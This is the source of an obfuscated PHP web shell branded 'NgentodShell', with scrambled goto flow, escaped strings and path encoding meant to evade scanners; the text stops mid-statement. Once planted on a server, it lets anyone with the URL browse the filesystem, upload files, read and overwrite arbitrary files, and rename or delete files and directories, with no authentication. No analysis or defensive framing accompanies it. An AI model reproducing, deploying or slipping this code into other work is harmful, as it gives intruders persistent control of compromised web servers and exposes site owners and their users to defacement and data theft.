<?php
 goto WVTup; ES4bL: define("\120\101\124\110", $p); goto tSD3_; W1Wc5: echo "\x3c\144\x69\166\40\x73\164\171\x6c\145\75\47\x6d\141\162\x67\x69\156\55\142\x6f\x74\164\x6f\x6d\x3a\40\x30\x70\170\73\x20\x6d\x61\x72\147\x69\156\x2d\154\x65\x66\164\x3a\x20\x30\x70\x78\73\47\76"; goto WFmyZ; wEjxz: echo "\74\142\x72\x3e"; goto s2RRh; VVJkD: function formatSizeUnits($bytes) { if ($bytes >= 1073741824) { $bytes = number_format($bytes / 1073741824, 2) . "\x20\107\x42"; } elseif ($bytes >= 1048576) { $bytes = number_format($bytes / 1048576, 2) . "\40\115\x42"; } elseif ($bytes >= 1024) { $bytes = number_format($bytes / 1024, 2) . "\x20\x4b\x42"; } elseif ($bytes > 1) { $bytes = $bytes . "\40\142\171\164\145\x73"; } elseif ($bytes == 1) { $bytes = $bytes . "\40\x62\x79\x74\145"; } else { $bytes = "\x30\40\x62\x79\x74\x65\163"; } return $bytes; } goto IDgb_; tPoiA: echo "\74\x61\40\x68\x72\x65\146\x3d\47\x3f\47\40\x63\154\141\x73\x73\x3d\x27\x62\165\x74\x74\x6f\156\47\x20\163\164\171\154\x65\75\47\155\141\x72\147\x69\156\x2d\162\151\x67\x68\x74\x3a\40\x31\67\x30\160\x78\x3b\47\76\x3c\151\x20\x63\x6c\141\x73\163\x3d\x27\x66\141\x73\40\146\x61\55\x68\157\155\x65\x27\76\74\57\x69\76\x20\x48\157\x6d\x65\74\x2f\x61\x3e\12\x3c\57\x64\x69\166\x3e"; goto pLmnc; pLmnc: echo "\74\x64\151\x76\40\x73\x74\x79\x6c\x65\x3d\47\x74\145\170\x74\x2d\x61\154\x69\147\156\72\40\143\x65\156\164\145\162\73\40\155\141\162\x67\151\x6e\x2d\x62\x6f\164\x74\x6f\155\x3a\40\x30\x70\170\73\x20\155\x61\x72\x67\151\156\x2d\x74\x6f\160\x3a\40\60\160\170\73\47\76\xa\74\150\61\40\x63\154\x61\x73\x73\75\x27\x63\162\x65\x65\160\163\x74\145\x72\55\x72\x65\147\165\154\141\162\x27\x3e\116\x67\145\156\164\x6f\144\x53\150\x65\154\154\74\57\150\x31\x3e\40\x3c\x21\x2d\x2d\40\112\165\x64\x75\x6c\x20\142\141\162\165\x20\55\55\x3e\12\74\x2f\x64\151\166\76"; goto e0j5f; rs8p9: if (isset($_GET["\165\x70\154\157\x61\x64"])) { echo "\xa\40\40\40\74\x63\x65\x6e\x74\145\x72\76\x20\x3c\146\x6f\x72\x6d\40\x6d\x65\x74\x68\157\x64\x3d\x22\160\157\x73\x74\x22\x20\x65\156\x63\x74\x79\160\x65\x3d\x22\155\165\154\164\151\x70\x61\162\164\x2f\146\x6f\x72\155\x2d\x64\141\164\141\42\76\12\x20\x20\x20\x20\x20\40\x20\40\12\40\x20\x20\x20\x20\x20\x20\x20\74\x69\156\x70\x75\164\40\164\171\x70\145\x3d\42\146\151\x6c\145\x22\40\x6e\141\155\x65\x3d\42\146\151\x6c\145\x54\157\x55\x70\154\157\141\144\x22\x20\151\x64\75\x22\146\x69\x6c\145\x54\157\125\x70\154\157\x61\x64\42\76\xa\40\40\x20\40\40\40\40\x20\74\x69\x6e\160\165\164\40\164\171\x70\x65\x3d\x22\163\x75\x62\155\x69\x74\x22\40\x63\x6c\141\163\163\75\42\x62\164\156\x20\142\164\x6e\55\x64\141\x72\153\x22\x20\x76\141\x6c\x75\x65\x3d\42\x55\x70\154\x6f\x61\x64\x22\x20\x6e\x61\155\145\75\42\x75\160\x6c\x6f\141\144\42\x3e\12\x20\x20\x20\x20\x3c\x2f\146\x6f\162\x6d\76\x3c\x2f\x63\145\156\x74\145\162\76"; } goto quTS2; x6hZI: function permissionToRWX($permission) { $rwx = array("\x2d", "\x78", "\x77", "\167\170", "\162", "\x72\55\170", "\x72\x77\55", "\162\167\170"); $permission = substr(sprintf("\45\x6f", $permission), -3); $rwx_permissions = ''; for ($i = 0; $i < strlen($permission); $i++) { $rwx_permissions .= $rwx[$permission[$i]]; } $is_accessible = is_readable(PATH) && is_writable(PATH) && is_executable(PATH); $color = $is_accessible ? "\147\162\x65\145\x6e" : "\x72\x65\144"; return "\x3c\x73\160\x61\156\40\163\x74\x79\154\145\x3d\x27\x63\157\154\157\162\x3a\x20{$color}\x3b\x27\x3e{$rwx_permissions}\x3c\x2f\163\160\141\x6e\x3e"; } goto W1Wc5; RchMn: echo "\x3c\x2f\x64\x69\x76\x3e"; goto xZMKW; vINrD: echo "\74\x2f\144\x69\166\x3e"; goto tPoiA; xZMKW: if (isset($_GET["\x70"])) { if (is_readable(PATH)) { $fetch_obj = scandir(PATH); $folders = array(); $files = array(); foreach ($fetch_obj as $obj) { if ($obj == "\56" || $obj == "\x2e\56") { continue; } $new_obj = PATH . "\x2f" . $obj; if (is_dir($new_obj)) { array_push($folders, $obj); } elseif (is_file($new_obj)) { array_push($files, $obj); } } } echo "\74\x74\141\142\154\145\76\xa\x20\x20\40\40\40\40\x20\x20\40\40\x20\x20\74\x74\x68\145\x61\144\x3e\xa\40\40\40\x20\40\40\x20\x20\x20\40\x20\40\40\40\x20\x20\74\164\162\x3e\xa\x20\x20\x20\40\40\x20\x20\x20\40\40\40\x20\40\40\40\x20\x20\40\x20\x20\x3c\x74\x68\76\74\x63\x65\x6e\x74\145\162\x3e\x4e\141\155\x65\x3c\57\x63\x65\156\164\145\162\x3e\74\x2f\164\x68\x3e\12\40\40\40\40\x20\40\40\x20\40\40\40\x20\40\x20\x20\x20\x20\x20\x20\40\x3c\164\150\x3e\74\x63\145\156\x74\x65\162\x3e\123\x69\172\x65\74\x2f\x63\x65\x6e\x74\x65\162\x3e\74\x2f\x74\x68\x3e\12\40\x20\40\x20\x20\x20\40\40\x20\x20\x20\40\x20\x20\x20\x20\x20\x20\x20\x20\x3c\x74\x68\x3e\x3c\x63\x65\156\x74\x65\162\x3e\114\x61\x73\164\40\x4d\x6f\144\x69\x66\151\145\144\x3c\57\143\145\x6e\164\x65\162\76\74\57\x74\x68\x3e\12\40\x20\40\40\40\x20\x20\x20\40\40\40\40\x20\x20\40\x20\40\40\x20\40\x3c\164\150\x3e\x3c\x63\145\x6e\x74\x65\x72\76\120\145\x72\x6d\151\163\163\x69\x6f\156\163\74\57\x63\x65\x6e\164\145\162\76\x3c\x2f\164\150\x3e\xa\x20\40\x20\40\40\40\x20\40\x20\40\x20\40\40\x20\x20\40\40\x20\x20\40\x3c\x74\x68\76\x3c\143\145\x6e\x74\145\x72\x3e\101\143\x74\x69\157\156\x73\74\x2f\x63\145\x6e\x74\145\x72\76\74\57\x74\150\x3e\12\x20\x20\x20\x20\x20\40\40\x20\x20\x20\40\x20\40\x20\x20\40\74\x2f\x74\x72\76\12\40\x20\x20\x20\x20\x20\40\40\40\x20\40\40\74\x2f\164\150\x65\141\x64\x3e\12\40\40\40\x20\40\40\x20\x20\x20\40\x20\x20\74\x74\x62\x6f\x64\x79\76"; foreach ($folders as $folder) { echo "\x20\x20\x3c\x64\x69\x76\40\x63\x6c\x61\x73\x73\75\x27\143\x75\x73\164\157\155\x2d\163\145\x6c\145\x63\x74\x27\76\x20\40\74\x74\162\76\xa\40\x20\40\40\x20\x20\40\x20\74\164\x64\76\74\151\40\143\x6c\141\163\x73\75\47\x66\141\x2d\x73\x6f\154\151\x64\x20\146\141\x2d\x66\x6f\x6c\x64\145\162\47\x3e\74\57\x69\x3e\40\74\x61\40\x68\x72\145\146\75\47\x3f\160\x3d" . urlencode(encodePath(PATH . "\x2f" . $folder)) . "\47\x3e" . $folder . "\x3c\57\141\x3e\x3c\57\x74\x64\76\xa\40\40\40\x20\x20\x20\x20\x20\74\x74\x64\76\74\x63\145\156\164\x65\x72\76\x3c\142\76\x2d\55\x2d\74\57\142\76\x3c\57\x74\x64\76\x3c\x2f\143\145\156\x74\x65\x72\76\xa\x20\x20\x20\x20\40\x20\40\40\74\x74\144\x3e\74\143\145\156\x74\x65\162\76" . date("\106\x20\144\40\x59\40\110\x3a\151\72\163\x2e", filemtime(PATH . "\x2f" . $folder)) . "\x3c\57\143\x65\156\x74\145\162\76\x3c\57\x74\x64\x3e\xa\40\40\x20\x20\40\x20\40\x20\74\x74\144\x3e\x3c\x63\145\x6e\x74\145\162\76" . permissionToRWX(fileperms(PATH . "\x2f" . $folder)) . "\x3c\57\164\x64\76\74\x2f\x63\145\156\x74\145\162\76\12\x20\40\40\x20\x20\x20\x20\x20\74\x74\x64\x3e\74\x63\x65\156\x74\x65\x72\76\12\40\40\40\x20\x20\40\x20\x20\x20\40\x20\40\x3c\x73\145\154\145\x63\164\40\157\x6e\x63\150\x61\x6e\x67\145\x3d\47\x6c\157\143\141\x74\x69\157\x6e\40\75\x20\164\150\x69\x73\56\x76\141\x6c\165\x65\73\47\76\12\x20\x20\x20\x20\40\x20\x20\40\40\40\x20\40\40\x20\40\x20\x3c\157\x70\x74\x69\x6f\156\x20\x76\141\x6c\165\x65\75\x27\47\76\x53\145\x6c\x65\x63\164\x3c\57\x6f\160\x74\x69\x6f\156\x3e\12\x20\x20\40\x20\40\x20\x20\40\40\40\40\40\40\40\40\40\74\157\160\x74\151\x6f\156\40\x76\x61\154\165\145\75\x27\77\161\75" . urlencode(encodePath(PATH)) . "\46\x72\75" . $folder . "\47\76\122\x65\x6e\141\x6d\145\x3c\57\x6f\160\x74\151\x6f\x6e\x3e\12\40\x20\x20\40\x20\40\x20\40\40\40\40\x20\x20\x20\40\x20\x3c\x6f\160\x74\x69\157\x6e\x20\x76\141\154\x75\145\75\x27\x3f\161\75" . urlencode(encodePath(PATH)) . "\46\144\75" . $folder . "\x27\76\104\x65\154\x65\164\x65\x3c\x2f\157\x70\x74\151\x6f\x6e\x3e\xa\x20\x20\x20\40\x20\x20\x20\40\x20\40\x20\x20\74\x2f\163\145\x6c\x65\143\x74\x3e\12\x20\40\x20\40\40\x20\x20\40\x3c\x2f\x74\x64\x3e\74\x2f\143\x65\156\x74\x65\162\76\xa\x20\40\x20\x20\x3c\x2f\x74\162\76\40\x3c\57\x64\x69\166\x3e\xa"; } foreach ($files as $file) { echo "\40\x20\40\40\74\164\x72\76\12\40\x20\40\x20\40\x20\x20\40\74\164\x64\x3e\x3c\151\40\x63\x6c\141\x73\x73\75\x27\146\x61\55\x73\157\x6c\151\x64\40\x66\x61\x2d\x66\x69\154\x65\x27\x3e\x3c\x2f\x69\x3e" . $file . "\74\57\164\x64\x3e\xa\40\x20\40\40\x20\40\74\x74\144\76\x3c\x63\145\156\164\x65\x72\x3e" . formatSizeUnits(filesize(PATH . "\57" . $file)) . "\x3c\x2f\x74\144\76\x3c\x2f\x63\145\156\x74\x65\162\76\xa\x20\x20\40\40\x20\x20\40\40\x3c\164\144\x3e\74\143\145\156\164\145\162\76" . date("\x46\x20\x64\x20\131\40\110\x3a\x69\72\163\56", filemtime(PATH . "\x2f" . $file)) . "\74\57\164\144\76\x3c\x2f\x63\x65\x6e\x74\145\162\76\12\x20\x20\40\40\x20\x20\x20\40\x3c\164\144\76\x3c\143\145\x6e\164\145\x72\76" . permissionToRWX(fileperms(PATH . "\x2f" . $file)) . "\74\57\164\144\x3e\x3c\57\143\145\x6e\164\145\x72\76\xa\40\40\x20\x20\40\40\40\40\x3c\x74\144\x3e\x3c\x63\x65\156\164\x65\162\x3e\12\x20\x20\x20\x20\x20\x20\40\40\x20\x20\x20\40\74\x73\145\x6c\145\143\164\40\157\x6e\x63\150\141\x6e\x67\145\75\x27\154\157\x63\141\164\151\157\x6e\40\x3d\x20\164\150\151\x73\56\166\x61\x6c\165\145\x3b\47\x3e\xa\40\x20\40\x20\x20\x20\40\40\40\40\40\40\40\40\x20\x20\x3c\x6f\160\x74\151\157\x6e\40\166\x61\x6c\x75\x65\75\47\x27\x3e\123\145\154\145\143\x74\74\x2f\x6f\x70\x74\x69\157\x6e\76\xa\x20\40\x20\x20\40\40\x20\x20\40\x20\x20\x20\40\x20\x20\x20\74\157\160\x74\151\157\156\x20\166\141\154\165\x65\x3d\47\77\x71\75" . urlencode(encodePath(PATH)) . "\46\145\75" . $file . "\47\x3e\x45\x64\x69\x74\40\x46\x69\154\x65\x3c\x2f\x6f\x70\x74\x69\157\x6e\76\12\x20\40\40\40\40\40\x20\x20\x20\x20\x20\x20\40\40\x20\x20\x3c\x6f\160\164\151\x6f\156\40\166\141\154\x75\x65\x3d\47\x3f\x71\75" . urlencode(encodePath(PATH)) . "\46\162\x3d" . $file . "\x27\76\x52\x65\x6e\x61\155\145\74\x2f\157\x70\164\x69\x6f\156\x3e\xa\x20\40\x20\40\40\x20\40\x20\x20\40\40\x20\x20\40\40\40\x3c\x6f\160\164\151\157\x6e\40\166\x61\154\x75\145\75\x27\77\161\x3d" . urlencode(encodePath(PATH)) . "\46\x64\75" . $file . "\x27\76\x44\x65\x6c\x65\x74\x65\74\57\x6f\x70\x74\x69\x6f\156\x3e\12\40\40\x20\40\x20\40\40\40\40\40\40\x20\x3c\x2f\163\x65\x6c\145\143\164\x3e\xa\40\40\40\x20\x20\40\x20\40\74\57\x74\144\76\x3c\57\143\x65\156\164\145\x72\x3e\12\x20\40\x20\x20\x3c\57\x74\x72\x3e\xa"; } echo "\x20\40\74\57\164\142\157\x64\171\x3e\12\x20\x20\40\x20\74\57\164\141\142\154\x65\x3e"; } else { if (empty($_GET)) { echo "\x3c\163\x63\x72\x69\x70\164\76\167\151\x6e\144\x6f\x77\x2e\x6c\x6f\143\141\x74\151\x6f\x6e\56\162\x65\160\154\141\x63\145\50\x27\77\160\x3d\x27\x29\x3b\74\57\163\143\162\151\160\x74\76"; } } goto rs8p9; Vvp8w: function encodePath($path) { $a = array("\x2f", "\x5c", "\x2e", "\72"); $b = array("\340\xa6\225", "\xe0\xa6\x96", "\340\246\x97", "\xe0\xa6\230"); return str_replace($a, $b, $path); } goto O4X47; vfK_1: if (isset($_POST["\x75\160\154\x6f\141\144"])) { $target_file = PATH . "\57" . $_FILES["\x66\x69\x6c\145\x54\x6f\125\x70\x6c\157\x61\x64"]["\156\141\155\x65"]; if (move_uploaded_file($_FILES["\146\151\154\145\124\157\125\x70\154\x6f\x61\144"]["\164\155\160\x5f\x6e\141\155\145"], $target_file)) { echo "\74\x70\76" . htmlspecialchars(basename($_FILES["\x66\x69\x6c\x65\124\157\x55\160\154\157\x61\144"]["\x6e\x61\155\145"])) . "\40\x68\141\x73\x20\x62\145\x65\x6e\x20\x75\160\154\x6f\x61\144\145\144\56\x3c\57\160\76"; } else { echo "\74\160\76\123\157\162\162\171\x2c\x20\x74\150\x65\x72\145\40\167\x61\163\40\x61\156\x20\x65\162\x72\x6f\x72\40\x75\x70\x6c\157\x61\144\x69\x6e\x67\x20\x79\x6f\165\162\40\x66\x69\x6c\x65\56\74\x2f\160\76"; } } goto e11eZ; y0rgA: $path = str_replace("\x5c", "\57", PATH); goto Y0PHX; e11eZ: if (isset($_GET["\x64"]) && isset($_GET["\x71"])) { $name = PATH . "\x2f" . $_GET["\x64"]; if (is_file($name)) { if (unlink($name)) { echo "\x3c\163\x63\162\x69\160\x74\76\141\154\145\162\x74\50\47\x46\x69\154\x65\x20\x72\x65\155\157\x76\145\144\x2e\x27\x29\73\x20\167\151\156\x64\157\167\56\154\157\143\x61\x74\151\157\x6e\x2e\162\145\x70\154\141\143\x65\x28\x27\77\x70\75" . encodePath(PATH) . "\47\x29\x3b\74\57\163\143\162\151\x70\164\x3e"; } else { echo "\74\x73\143\x72\151\x70\164\x3e\141\x6c\x65\162\164\x28\47\x53\157\155\x65\x20\x65\x72\x72\157\162\40\157\143\143\x75\162\162\145\x64\56\47\x29\73\x20\x77\151\156\x64\x6f\167\56\154\x6f\143\x61\x74\151\157\x6e\x2e\162\145\160\154\x61\x63\145\50\x27\x3f\160\x3d" . encodePath(PATH) . "\47\x29\73\74\x2f\x73\x63\x72\151\160\164\76"; } } elseif (is_dir($name)) { if (rmdir($name) == true) { echo "\74\x73\143\x72\151\160\164\x3e\141\154\x65\162\164\x28\x27\104\x69\x72\x65\x63\164\x6f\162\x79\x20\x72\x65\x6d\x6f\x76\145\144\x2e\47\51\x3b\x20\167\151\156\x64\x6f\167\56\x6c\x6f\x63\141\x74\x69\157\156\x2e\x72\x65\160\x6c\x61\x63\x65\x28\47\x3f\160\75" . encodePath(PATH) . "\47\51\73\x3c\x2f\163\x63\162\x69\160\x74\x3e"; } else { echo "\74\x73\143\x72\151\160\x74\x3e\141\154\145\162\x74\x28\47\x53\x6f\155\x65\x20\x65\162\162\157\x72\40\157\143\143\165\x72\x72\x65\x64\x2e\x27\x29\x3b\x20\x77\151\x6e\144\157\167\56\x6c\x6f\143\141\x74\x69\x6f\156\56\x72\x65\160\154\141\x63\x65\x28\x27\77\x70\x3d" . encodePath(PATH) . "\47\x29\73\x3c\x2f\x73\143\162\x69\x70\x74\x3e"; } } } goto L7Zhi; Y0PHX: $paths = explode("\x2f", $path); goto o1P4f; WFmyZ: echo "\x3c\x70\x20\x73\x74\x79\154\145\x3d\x27\146\x6f\x6e\164\55\163\151\172\145\72\40\x31\x34\160\170\x3b\40\x63\x6f\x6c\x6f\162\x3a\40\x77\x68\151\x74\145\x3b\47\x3e\125\x6e\x61\x6d\x65\x20\72\x20\74\x73\160\141\156\40\x73\x74\171\154\x65\75\x27\x63\157\154\x6f\162\72\x20\x6c\x69\155\145\x3b\47\x3e" . php_uname("\x61") . "\74\x2f\x70\x3e"; goto vINrD; o1P4f: foreach ($paths as $id => $dir_part) { if ($dir_part == '' && $id == 0) { $a = true; echo "\74\141\40\150\162\145\146\75\x22\x3f\x70\x3d\57\42\x20\x73\x74\171\x6c\145\75\x27\143\x6f\154\x6f\x72\72\40\167\150\x69\164\x65\x3b\x20\164\145\x78\x74\x2d\144\x65\x63\x6f\x72\x61\x74\151\157\x6e\72\40\x6e\157\x6e\x65\73\x27\76\x3c\x69\x20\x63\154\x61\163\163\x3d\47\x66\141\40\146\x61\x2d\150\144\x64\47\40\76\74\57\151\76\40\72\40\x2f\74\57\141\x3e"; continue; } if ($dir_part == '') { continue; } echo "\74\x61\x20\x68\162\145\146\75\47\x3f\x70\x3d"; for ($i = 0; $i <= $id; $i++) { echo str_replace("\x3a", "\xe0\xa6\230", $paths[$i]); if ($i != $id) { echo "\xe0\xa6\225"; } } echo "\47\40\163\x74\x79\x6c\x65\x3d\47\x66\x6f\156\164\x2d\163\151\172\145\72\61\64\160\170\x3b\40\x63\157\x6c\x6f\x72\x3a\40\167\x68\151\164\145\73\x20\x74\145\x78\164\x2d\144\145\x63\157\162\141\x74\151\x6f\156\x3a\x20\x6e\x6f\156\x65\x3b\x27\x3e" . $dir_part . "\x3c\57\141\x3e\57"; } goto tmvp2; IDgb_: function fileExtension($file) { return substr(strrchr($file, "\x2e"), 1); } goto BpRGt; JdGoZ: if (isset($_GET["\x70"])) { if (empty($_GET["\160"])) { $p = $root_path; } elseif (!is_dir(decodePath($_GET["\x70"]))) { echo "\74\163\143\162\x69\x70\x74\x3e\xa\141\154\145\162\164\50\47\x44\x69\162\x65\143\x74\157\162\171\x20\x69\163\x20\103\x6f\x72\162\x75\160\164\145\x64\x20\x61\156\x64\40\125\x6e\162\x65\141\x64\141\142\154\145\56\47\x29\x3b\12\x77\x69\156\144\x6f\167\56\154\x6f\x63\x61\x74\x69\x6f\156\56\x72\x65\x70\154\141\x63\145\50\47\77\x27\x29\73\xa\x3c\57\163\x63\162\x69\x70\x74\76"; } elseif (is_dir(decodePath($_GET["\x70"]))) { $p = decodePath($_GET["\x70"]); } } elseif (isset($_GET["\161"])) { if (!is_dir(decodePath($_GET["\161"]))) { echo "\74\x73\143\x72\151\x70\164\76\x77\151\156\144\x6f\167\x2e\x6c\157\143\141\x74\x69\157\156\56\162\x65\160\x6c\141\143\x65\x28\x27\77\160\75\47\x29\73\x3c\x2f\163\x63\162\151\x70\164\76"; } elseif (is_dir(decodePath($_GET["\x71"]))) { $p = decodePath($_GET["\x71"]); } } else { $p = $root_path; } goto ES4bL; tmvp2: echo "\x3c\57\x70\76"; goto RchMn; PRdfN: if (isset($_GET["\x65"])) { if (!empty($_GET["\145"]) && isset($_GET["\161"])) { echo "\xa\40\40\40\40\74\143\145\156\164\145\x72\76\x3c\x66\157\x72\x6d\x20\x6d\145\164\150\157\144\75\42\x70\157\x73\x74\42\76\xa\40\x20\x20\x20\x20\x20\x20\x20\x3c\x74\x65\170\164\x61\162\x65\141\40\163\164\x79\154\x65\x3d\42\150\x65\151\147\150\x74\72\40\x35\60\60\x70\x78\73\12\40\x20\40\40\x20\40\x20\x20\x77\x69\144\164\x68\72\40\x39\60\45\x3b\x22\40\x6e\141\155\145\x3d\42\144\141\164\x61\x22\x3e" . htmlspecialchars(file_get_contents(PATH . "\x2f" . $_GET["\x65"])) . "\74\57\164\x65\170\164\x61\162\x65\141\x3e\xa\x20\x20\40\40\x20\x20\40\40\74\x62\x72\x3e\12\x20\40\40\40\x20\x20\x20\40\74\x69\x6e\160\165\x74\x20\164\171\x70\145\75\x22\163\165\142\155\151\164\42\40\x63\x6c\141\163\163\75\42\x62\x74\156\x20\142\x74\156\x2d\x64\141\x72\153\x22\40\x76\x61\154\165\x65\x3d\42\123\141\166\145\42\40\156\x61\x6d\x65\75\42\145\x64\151\x74\x22\x3e\12\40\x20\x20\x20\74\x2f\146\x6f\162\x6d\76\74\x2f\x63\145\x6e\164\x65\162\76"; if (isset($_POST["\145\144\x69\x74"])) { $filename = PATH . "\x2f" . $_GET["\x65"]; $data = $_POST["\144\141\164\141"]; $open = fopen($filename, "\167"); if (fwrite($open, $data)) { echo "\x3c\x73\x63\162\x69\160\x74\76\141\154\x65\x72\x74\50\x27\123\x61\x76\x65\x64\x2e\x27\51\73\x20\167\151\156\x64\157\x77\x2e\x6c\x6f\143\x61\164\x69\x6f\156\56\162\145\x70\154\141\143\145\x28\x27\77\x70\x3d" . encodePath(PATH) . "\x27\51\73\74\57\163\x63\162\151\x70\x74\76"; } else { echo "\74\x73\x63\x72\x69\x70\164\76\141\154\145\162\164\x28\x27\123\x6f\x6d\x65\x20\145\162\x72\157\162\40\x6f\143\x63\165\x72\x72\145\144\56\x27\51\x3b\x20\167\151\x6e\x64\x6f\167\56\154\157\x63\x61\164\x69\157\x6e\x2e\x72\x65\x70\154\x61\x63\145\x28\x27\x3f\160\x3d" . encodePath(PATH) . "\47\51\73\74\57\163\143\162\151\x70\164\x3e"; } fclose($open); } } } goto vfK_1; s2RRh: $root_path = __DIR__; goto JdGoZ; BpRGt: function fileIcon($file) { $imgs = array("\141\x70\x6e\x67", "\x61\166\151\146", "\147\x69\146", "\152\160\147", "\152\x70\145\147", "\152\146\x69\146", "\160\152\160\145\x67", "\x70\152\160", "\x70\x6e\x67", "\163\x76\x67", "\167\145\x62\x70"); $audio = array("\x77\141\x76", "\155\64\x61", "\x6d\64\x62", "\155\x70\x33", "\157\147\x67", "\x77\145\x62\x6d", "\155\x70\143"); $ext = strtolower(fileExtension($file)); if ($file == "\x65\162\x72\x6f\162\x5f\x6c\x6f\147") { return "\x3c\x69\40\143\x6c\141\163\163\75\42\146\x61\x2d\x73\150\x61\x72\x70\40\146\141\x2d\163\x6f\154\x69\x64\40\146\x61\55\x62\165\147\42\x3e\74\57\x69\76\40"; } elseif ($file == "\56\150\164\141\x63\143\145\x73\x73") { return "\74\151\40\143\154\141\x73\163\x3d\x22\146\141\x2d\x73\157\x6c\151\144\40\x66\141\55\150\x61\x6d\155\145\x72\42\76\74\57\x69\x3e\x20"; } if ($ext == "\150\x74\x6d\x6c" || $ext == "\x68\x74\x6d") { return "\x3c\151\40\x63\154\141\x73\x73\75\x22\x66\x61\55\x62\162\141\x6e\144\x73\40\146\141\x2d\150\164\155\x6c\x35\42\x3e\74\57\151\76\x20"; } elseif ($ext == "\160\x68\160" || $ext == "\160\x68\x74\155\154") { return "\74\151\40\143\154\x61\163\163\x3d\42\146\141\x2d\142\x72\x61\x6e\144\x73\40\146\141\55\160\150\x70\x22\x3e\x3c\x2f\151\x3e\40"; } elseif (in_array($ext, $imgs)) { return "\74\x69\40\x63\154\x61\x73\163\x3d\42\x66\141\55\162\145\x67\165\x6c\141\x72\x20\146\141\55\151\155\141\147\145\163\42\x3e\x3c\57\151\76\40"; } elseif ($ext == "\143\163\x73") { return "\74\151\x20\143\154\x61\x73\x73\75\42\x66\141\x2d\x62\162\x61\x6e\x64\163\x20\x66\x61\x2d\x63\x73\x73\63\x22\x3e\74\57\151\x3e\40"; } elseif ($ext == "\164\170\164") { return "\74\151\x20\x63\154\x61\163\163\x3d\x22\x66\141\55\x72\x65\147\165\x6c\141\x72\x20\x66\x61\x2d\146\151\x6c\x65\x2d\154\x69\x6e\x65\x73\42\76\x3c\57\151\x3e\x20"; } elseif (in_array($ext, $audio)) { return "\x3c\151\40\x63\154\x61\x73\163\75\42\146\x61\x2d\144\165\157\x74\157\x6e\x65\40\146\x61\55\146\151\154\x65\55\x6d\x75\x73\151\143\x22\76\x3c\57\151\76\x20"; } elseif ($ext == "\160\171") { return "\74\151\x20\x63\x6c\141\x73\x73\x3d\x22\x66\141\x2d\x62\x72\141\x6e\144\163\x20\x66\141\x2d\160\x79\x74\150\x6f\156\x22\x3e\x3c\x2f\x69\76\40"; } elseif ($ext == "\152\163") { return "\74\x69\x20\x63\154\x61\163\163\75\x22\x66\141\55\x62\162\141\x6e\x64\163\x20\146\x61\x2d\152\163\x22\x3e\74\57\151\x3e\40"; } else { return "\74\151\x20\143\x6c\x61\163\x73\75\42\146\141\55\x73\157\154\x69\144\40\146\x61\x2d\x66\x69\154\x65\42\x3e\x3c\x2f\151\x3e\x20"; } } goto Vvp8w; O4X47: function decodePath($path) { $a = array("\57", "\x5c", "\56", "\72"); $b = array("\340\246\x95", "\340\246\x96", "\xe0\xa6\227", "\340\246\x98"); return str_replace($b, $a, $path); } goto x6hZI; WVTup: ?>
<!doctypehtml><html lang="en"><head><meta charset="UTF-8"><meta content="width=device-width,initial-scale=1"name="viewport"><title>#xshikataganai</title><link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css"rel="stylesheet"crossorigin="anonymous"integrity="sha512-SzlrxWUlpfuzQ+pcUCosxcglQRNAq/DZjVsC0lE40xsADsfeQoEypE+enwcOiGjk/bSuGGKHEyjSoQ1zVisanQ=="referrerpolicy="no-referrer"><link href="https://fonts.googleapis.com"rel="preconnect"><link href="https://fonts.gstatic.com"rel="preconnect"crossorigin><link href="https://fonts.googleapis.com/css2?family=Creepster&family=Rock+Salt&display=swap"rel="stylesheet"><style>body{background-color:#000;color:#fff;font-size:16px}table{width:100%;border-collapse:collapse}table,td,th{border:2px solid #fff;font-size:14px}th{background-color:#000}.fa{margin-right:5px}.fa-folder{color:gold}.fa-file{color:#87ceeb}a{text-decoration:none;color:#fff}.button{display:inline-block;padding:8px 15px;margin-right:10px;background-image:linear-gradient(to right,#ff5858,#f857a6);border:none;color:#fff;text-align:center;text-decoration:none;font-size:12px;transition-duration:.4s;cursor:pointer;border-radius:10px}.button:hover{background-image:linear-gradient(to right,#ff5858,#f857a6)}.creepster-regular{font-family:Creepster,system-ui;font-weight:400;font-style:normal;font-size:55px;font-color:red}</style></head><body><?php  goto VVJkD; e0j5f: echo "\xa\40\40\x3c\x63\x65\x6e\x74\x65\162\x3e\x20\40\74\x66\x6f\x72\155\x20\x6d\x65\x74\150\x6f\144\75\x22\x70\157\163\164\x22\x20\x65\156\x63\164\x79\160\x65\x3d\42\x6d\165\x6c\164\x69\160\x61\162\164\57\146\x6f\162\x6d\x2d\x64\141\164\x61\x22\76\x20\x20\40\x20\x20\x20\40\xa\40\40\40\x20\x20\40\x20\40\x3c\151\156\x70\165\164\x20\164\x79\160\145\x3d\42\146\151\x6c\x65\42\40\156\141\155\145\x3d\42\x66\151\x6c\x65\x54\x6f\125\x70\x6c\x6f\141\x64\42\x20\151\144\75\x22\146\151\154\x65\124\x6f\125\160\x6c\x6f\x61\x64\x22\76\12\x20\40\40\x20\x20\x20\x20\x20\x3c\x69\x6e\160\x75\164\x20\x74\171\x70\145\x3d\x22\x73\x75\142\155\x69\164\42\40\x63\x6c\141\163\163\x3d\42\142\164\x6e\40\x62\164\x6e\x2d\144\141\x72\x6b\42\x20\166\x61\x6c\x75\145\75\x22\x55\160\154\157\x61\x64\x22\x20\x6e\x61\155\x65\x3d\x22\x75\x70\154\157\x61\x64\42\x3e\12\40\40\x20\x20\x3c\57\x66\157\x72\x6d\76\x3c\57\x63\x65\x6e\164\145\x72\76"; goto wEjxz; quTS2: if (isset($_GET["\162"])) { if (!empty($_GET["\162"]) && isset($_GET["\161"])) { echo "\12\40\x20\x20\x3c\143\x65\156\x74\145\x72\76\40\x3c\146\x6f\x72\155\x20\x6d\145\164\150\157\144\75\42\x70\157\163\x74\x22\76\12\40\40\40\40\x20\40\x20\x20\x52\145\x6e\x61\x6d\145\x3a\12\40\x20\40\x20\x20\40\40\x20\74\151\156\160\x75\x74\40\x74\171\160\x65\x3d\x22\164\x65\170\164\42\40\x6e\x61\155\145\x3d\x22\156\x61\x6d\x65\42\40\x76\x61\154\165\x65\x3d\x22" . $_GET["\162"] . 